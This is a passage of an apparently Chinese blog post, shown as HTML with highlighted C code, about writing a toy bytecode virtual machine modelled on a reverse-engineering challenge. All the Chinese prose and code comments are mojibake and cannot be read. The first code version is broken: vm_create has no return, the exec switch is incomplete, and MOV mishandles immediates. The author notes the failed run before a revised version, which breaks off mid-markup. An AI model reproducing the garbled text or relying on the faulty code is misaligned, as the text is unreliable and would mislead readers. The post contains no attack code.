å®šä¹‰è™šæ‹Ÿæœºç»“æ„ä½“ï¼ŒåŒ…å«å†…å­˜ã€å¯„å­˜å™¨å’Œè¿è¡ŒçŠ¶æ€ç­‰å­—æ®µ</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> mem<span class=\"token punctuation\">[</span>MEM_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// å†…å­˜ç©ºé—´ï¼Œæ¯ä¸ªå•å…ƒ 8 ä½ï¼ˆ1 å­—èŠ‚ï¼‰</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token class-name\">uint16_t</span> reg<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// å¯„å­˜å™¨æ•°ç»„ï¼Œæ¯ä¸ªå¯„å­˜å™¨ 16 ä½ï¼ˆ2 å­—èŠ‚ï¼‰</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">int</span> running<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// è¿è¡ŒçŠ¶æ€ï¼Œ0 è¡¨ç¤ºåœæ­¢ï¼Œ1 è¡¨ç¤ºè¿è¡Œä¸­</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token punctuation\">&#125;</span> VM<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token comment\">// åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ï¼Œå¹¶è¿”å›æŒ‡é’ˆ</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>VM<span class=\"token operator\">*</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    VM<span class=\"token operator\">*</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// åˆ†é…å†…å­˜ç©ºé—´ç»™è™šæ‹Ÿæœºå®ä¾‹</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// å°†ç¨‹åºè®¡æ•°å™¨ç½®ä¸º 0ï¼ˆä»å†…å­˜åœ°å€ 0 å¼€å§‹æ‰§è¡Œï¼‰</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MEM_SIZE <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// å°†æ ˆæŒ‡é’ˆç½®ä¸ºå†…å­˜æœ€é«˜åœ°å€ - 2ï¼ˆæ ˆä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼‰</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// å°†æ ‡å¿—å¯„å­˜å™¨ç½®ä¸º 0ï¼ˆæ— æ¯”è¾ƒç»“æœï¼‰</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// å°†è¿è¡ŒçŠ¶æ€ç½®ä¸º 1ï¼ˆå¼€å§‹æ‰§è¡Œï¼‰</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>     <span class=\"token comment\">// åˆå§‹åŒ–å…¶ä»–å¯„å­˜å™¨ä¸º 0</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R1<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R3<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token comment\">// åŠ è½½ä¸€æ®µç¨‹åºåˆ°è™šæ‹Ÿæœºçš„å†…å­˜ä¸­ï¼Œå¹¶è¿”å›åŠ è½½åçš„ç¨‹åºé•¿åº¦ï¼ˆå­—èŠ‚æ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">,</span> <span class=\"token class-name\">uint8_t</span><span class=\"token operator\">*</span> prog<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                        <span class=\"token comment\">// åˆå§‹åŒ–ç¨‹åºé•¿åº¦ä¸º 0</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>prog <span class=\"token operator\">!=</span> HLT<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>              <span class=\"token comment\">// å¾ªç¯è¯»å–ç¨‹åºå­—èŠ‚ï¼Œç›´åˆ°é‡åˆ° HLT æŒ‡ä»¤</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>prog<span class=\"token punctuation\">;</span> <span class=\"token comment\">// å°†å½“å‰å­—èŠ‚å†™å…¥è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œç›¸å¯¹äºç¨‹åºè®¡æ•°å™¨çš„åç§»åœ°å€</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>        prog<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                         <span class=\"token comment\">// æŒ‡å‘ä¸‹ä¸€ä¸ªå­—èŠ‚</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        len<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>                          <span class=\"token comment\">// ç¨‹åºé•¿åº¦åŠ  1</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    vm<span class=\"token operator\">-></span>mem<span class=\"token punctuation\">[</span>vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> len<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> HLT<span class=\"token punctuation\">;</span>   <span class=\"token comment\">// å°† HLT æŒ‡ä»¤å†™å…¥è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œä½œä¸ºç¨‹åºçš„ç»“æŸæ ‡å¿—</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">return</span> len <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                     <span class=\"token comment\">// è¿”å›ç¨‹åºé•¿åº¦ï¼ˆåŒ…å« HLT æŒ‡ä»¤ï¼‰</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h3 id=\"æ‰§è¡Œå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#æ‰§è¡Œå‡½æ•°\">#</a> æ‰§è¡Œå‡½æ•°</h3>\n<p>æœ¬æ¥æƒ³åœ¨ case é‡Œé¢å®šä¹‰ dst src ç¼“å­˜å˜é‡çš„ï¼Œç»“æœ vscode ä¸€ç›´æŠ¥é”™ åªå¥½æå‰å®šä¹‰äº†</p>\n<pre><code>// å®šä¹‰ä¸€ä¸ªæ‰§è¡Œå‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ä½œä¸ºå‚æ•°\nvoid vm_exec(VM* vm) &#123;\n    uint8_t dst;//ç„¯äº† æœ¬æ¥æƒ³åœ¨caseé‡Œé¢å®šä¹‰çš„\n    uint8_t src;\n    while (vm-&gt;running) &#123; // å¾ªç¯æ‰§è¡Œï¼Œç›´åˆ°è¿è¡ŒçŠ¶æ€ä¸º0\n        uint8_t op = vm-&gt;mem[vm-&gt;reg[PC]]; // ä»å†…å­˜ä¸­è¯»å–å½“å‰æŒ‡ä»¤\n        switch (op) &#123; // æ ¹æ®æŒ‡ä»¤ç±»å‹è¿›è¡Œåˆ†æ”¯å¤„ç†\n            case HLT: // åœæ­¢æ‰§è¡Œ\n                vm-&gt;running = 0; // å°†è¿è¡ŒçŠ¶æ€ç½®ä¸º0\n                break;\n            case MOV: // ç§»åŠ¨æ•°æ®\n                dst = vm-&gt;mem[vm-&gt;reg[PC] + 1]; // è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰\n                src = vm-&gt;mem[vm-&gt;reg[PC] + 2]; // è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰\n                vm-&gt;reg[dst] = vm-&gt;reg[src]; // å°†æºå¯„å­˜å™¨çš„å€¼èµ‹ç»™ç›®æ ‡å¯„å­˜å™¨\n                vm-&gt;reg[PC] += 3; // å°†ç¨‹åºè®¡æ•°å™¨å¢åŠ 3ï¼ˆè·³è¿‡æŒ‡ä»¤å’Œæ“ä½œæ•°ï¼‰\n                break;\n            case ADD: // åŠ æ³•è¿ç®—\n                dst = vm-&gt;mem[vm-&gt;reg[PC] + 1]; // è¯»å–ç›®æ ‡å¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼‰\n                src = vm-&gt;mem[vm-&gt;reg[PC] + 2]; // è¯»å–æºå¯„å­˜å™¨ç¼–å·ï¼ˆç¬¬äºŒä¸ªæ“ä½œæ•°ï¼‰\n                uint16_t res = vm-&gt;reg[dst] + vm-&gt;reg[src]; // è®¡ç®—ä¸¤ä¸ªå¯„å­˜å™¨çš„å€¼ä¹‹å’Œï¼Œå¹¶ä¿å­˜åœ¨16ä½å˜é‡ä¸­\n                if (res == 0) &#123; // å¦‚æœç»“æœä¸º0ï¼Œåˆ™å°†é›¶æ ‡å¿—ç½®ä¸º1ï¼Œå¦åˆ™ç½®ä¸º0\n                    vm-&gt;reg[FLG] = 1;\n                &#125; else &#123;\n                    vm-&gt;reg[FLG] = 0;\n                &#125;   \n            &#125;\n            break;\n        &#125;\n    &#125;\n</code></pre>\n<h3 id=\"æµ‹è¯•ç”¨å‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#æµ‹è¯•ç”¨å‡½æ•°\">#</a> æµ‹è¯•ç”¨å‡½æ•°</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// ä¸€ä¸ªæµ‹è¯•å‡½æ•°ï¼Œæ¥å—ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ä½œä¸ºå‚æ•°</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span>VM<span class=\"token operator\">*</span> vm<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token comment\">// å®šä¹‰ä¸€æ®µæµ‹è¯•ç¨‹åºï¼ŒåŒ…å«ä»¥ä¸‹æŒ‡ä»¤ï¼š</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// MOV R0, 10   // å°† 10 èµ‹ç»™å¯„å­˜å™¨ R0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token comment\">// MOV R1, 20   // å°† 20 èµ‹ç»™å¯„å­˜å™¨ R1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token comment\">// ADD R2, R0   // å°†å¯„å­˜å™¨ R0 å’Œ R1 çš„å€¼ç›¸åŠ ï¼Œå¹¶èµ‹ç»™å¯„å­˜å™¨ R2</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// HLT          // åœæ­¢æ‰§è¡Œ</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> prog<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>MOV<span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> MOV<span class=\"token punctuation\">,</span> R1<span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> ADD<span class=\"token punctuation\">,</span> R2<span class=\"token punctuation\">,</span> R0<span class=\"token punctuation\">,</span> HLT<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span> <span class=\"token function\">vm_load</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">,</span> prog<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// åŠ è½½æµ‹è¯•ç¨‹åºåˆ°è™šæ‹Ÿæœºå†…å­˜ä¸­ï¼Œå¹¶è·å–ç¨‹åºé•¿åº¦</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Loaded %d bytes of program.\\n\"</span><span class=\"token punctuation\">,</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰“å°ç¨‹åºé•¿åº¦</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">vm_exec</span><span class=\"token punctuation\">(</span>vm<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰§è¡Œè™šæ‹Ÿæœº</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Register values:\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>     <span class=\"token comment\">// æ‰“å°å¯„å­˜å™¨çš„å€¼</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">7</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"R%d: %d\\n\"</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Execution finished.\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰“å°æ‰§è¡Œç»“æŸ</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token function\">vm_test</span><span class=\"token punctuation\">(</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå‡ºé”™äº†æˆ‘ç„¯</p>\n<p><strong>mov æŒ‡ä»¤å®ç°æœ‰é—®é¢˜</strong>:mov æŒ‡ä»¤åˆ†æƒ…å†µå“‡ï¼Œä¸€ç§æ˜¯ç«‹å³æ•°èµ‹ç»™å¯„å­˜å™¨ ä¸€ç§æ˜¯å¯„å­˜å™¨ç»™å¯„å­˜å™¨</p>\n<p>ç„¶åè™šæ‹Ÿæœºçš„åˆå§‹åŒ–æœ‰é—®é¢˜ <strong>æŒ‡ä»¤è¯»å–æœ‰é—®é¢˜</strong></p>\n<h3 id=\"æ”¹å˜æ€è·¯è§£å†³é—®é¢˜\"><a class=\"markdownIt-Anchor\" href=\"#æ”¹å˜æ€è·¯è§£å†³é—®é¢˜\">#</a> æ”¹å˜æ€è·¯è§£å†³é—®é¢˜</h3>\n<p><img data-src=\"/images/image-20230317205054119.png\" alt=\"image.png\"></p>\n<p>çœ‹ä¹‹å‰åšè¿‡çš„ vm é€†å‘é¢˜ç›® å‘ç°å¤šäº†ä¸€ä¸ªæ•°æ¥åˆ¤æ–­çš„ äºæ˜¯æ”¹å˜æ€è·¯ æ¨¡ä»¿ç€è¿™é“é¢˜å†™è™šæ‹Ÿæœº</p>\n<h3 id=\"å®Œå–„åçš„ä»£ç \"><a class=\"markdownIt-Anchor\" href=\"#å®Œå–„åçš„ä»£ç \">#</a> å®Œå–„åçš„ä»£ç </h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdint.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºçš„å†…å­˜å¤§å°</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MEM_SIZE</span> <span class=\"token expression\"><span class=\"token number\">512</span></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºæ”¯æŒçš„æŒ‡ä»¤é›†</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    MOV<span class=\"token punctuation\">,</span> <span class=\"token comment\">// ç§»åŠ¨æ•°æ®</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    PUSH<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    POP<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    ALU<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    CMP<span class=\"token punctuation\">,</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    JMP<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tJNE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tJE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    SUB<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    HLT<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºæ”¯æŒçš„å¯„å­˜å™¨</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">enum</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    R0<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    R1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    R2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    R3<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    R4<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    PC<span class=\"token punctuation\">,</span> <span class=\"token comment\">// ç¨‹åºè®¡æ•°å™¨</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    SP<span class=\"token punctuation\">,</span> <span class=\"token comment\">// æ ˆæŒ‡é’ˆ</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    FLG<span class=\"token punctuation\">,</span><span class=\"token comment\">// æ ‡å¿—å¯„å­˜å™¨ï¼ˆç”¨äºä¿å­˜æ¯”è¾ƒç»“æœï¼‰</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">// å®šä¹‰è™šæ‹Ÿæœºç»“æ„ä½“ï¼ŒåŒ…å«å†…å­˜ã€å¯„å­˜å™¨å’Œè¿è¡ŒçŠ¶æ€ç­‰å­—æ®µ</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token class-name\">uint8_t</span> mem<span class=\"token punctuation\">[</span>MEM_SIZE<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>   <span class=\"token comment\">// å†…å­˜ç©ºé—´ï¼Œæ¯ä¸ªå•å…ƒ 8 ä½ï¼ˆ1 å­—èŠ‚ï¼‰</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token class-name\">uint16_t</span> reg<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// å¯„å­˜å™¨æ•°ç»„ï¼Œæ¯ä¸ªå¯„å­˜å™¨ 16 ä½ï¼ˆ2 å­—èŠ‚ï¼‰</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token keyword\">int</span> running<span class=\"token punctuation\">;</span>             <span class=\"token comment\">// è¿è¡ŒçŠ¶æ€ï¼Œ0 è¡¨ç¤ºåœæ­¢ï¼Œ1 è¡¨ç¤ºè¿è¡Œä¸­</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span> VM<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token comment\">// åˆ›å»ºå¹¶åˆå§‹åŒ–ä¸€ä¸ªè™šæ‹Ÿæœºå®ä¾‹ï¼Œå¹¶è¿”å›æŒ‡é’ˆ</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>VM<span class=\"token operator\">*</span> <span class=\"token function\">vm_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    VM<span class=\"token operator\">*</span> vm <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VM<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token comment\">// åˆ†é…å†…å­˜ç©ºé—´ç»™è™šæ‹Ÿæœºå®ä¾‹</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>PC<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// å°†ç¨‹åºè®¡æ•°å™¨ç½®ä¸º 0ï¼ˆä»å†…å­˜åœ°å€ 0 å¼€å§‹æ‰§è¡Œï¼‰</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>SP<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> MEM_SIZE <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>         <span class=\"token comment\">// å°†æ ˆæŒ‡é’ˆç½®ä¸ºå†…å­˜æœ€é«˜åœ°å€ - 2ï¼ˆæ ˆä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼‰</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>FLG<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>                   <span class=\"token comment\">// å°†æ ‡å¿—å¯„å­˜å™¨ç½®ä¸º 0ï¼ˆæ— æ¯”è¾ƒç»“æœï¼‰</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    vm<span class=\"token operator\">-></span>running <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>                    <span class=\"token comment\">// å°†è¿è¡ŒçŠ¶æ€ç½®ä¸º 1ï¼ˆå¼€å§‹æ‰§è¡Œï¼‰</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token comment\">// åˆå§‹åŒ–å…¶ä»–å¯„å­˜å™¨ä¸º 0</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    vm<span class=\"token operator\">-></span>reg<span class=\"token punctuation\">[</span>R0<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    vm<span class=\"token 